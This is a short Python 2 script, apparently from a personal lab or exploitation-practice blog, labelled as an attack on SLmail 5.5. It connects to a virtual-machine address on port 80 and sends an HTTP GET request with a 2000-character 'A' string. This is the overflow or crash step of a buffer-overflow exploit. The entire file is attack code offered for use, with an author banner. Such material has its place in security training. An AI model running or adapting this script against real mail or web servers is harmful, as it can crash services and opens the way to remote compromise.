#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket

conexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

logo = """\n
	Script attack slmail 5.5
	Autor: Yonatan_Correa

	twitter: @Yonatan_correa
	Blog: https://risataim.blogspot.com

"""

print logo

host = "192.168.0.14" #ip de la maquina virtual

junk = "A" * 2000

try:
	print "Enviando exploit"
	conexion.connect((host,80))

	buff = 'GET ' + junk + " HTTP/1.1\r\n\r\n"

	conexion.send(buff)
	conexion.close()
	print "\n Enviando"

except:

	print "error de conexion"
